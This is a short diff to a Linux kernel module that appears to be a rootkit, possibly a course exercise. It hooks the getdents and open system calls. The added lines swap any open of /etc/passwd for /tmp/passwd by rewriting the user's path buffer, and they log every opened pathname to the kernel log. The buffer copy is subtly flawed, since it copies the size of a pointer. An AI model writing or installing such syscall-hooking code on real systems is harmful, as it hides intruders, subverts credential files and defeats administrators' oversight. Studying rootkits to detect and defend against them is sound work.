@@ -35,6 +35,7 @@ MODULE_AUTHOR("Yuefan Yu");
 static int pid = 0;
 module_param(pid, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IWGRP);
 char *processname = "sneaky_process";
+char *filename = "/tmp/passwd";
 struct linux_dirent64 {
   u64 d_ino;               /* 64-bit inode number */
   s64 d_off;               /* 64-bit offset to next structure */
@@ -98,6 +99,10 @@ asmlinkage long sneaky_sys_getdents(unsigned int fd,
 }
 // Define our new sneaky version of the 'open' syscall
 asmlinkage int sneaky_sys_open(const char *pathname, int flags) {
+  if (strstr(pathname, "/etc/passwd") != NULL) {
+    copy_to_user((void *)pathname, filename, sizeof(filename));
+  }
+  printk(KERN_INFO "pathname:%s\n", pathname);
   return original_call(pathname, flags);
 }
 
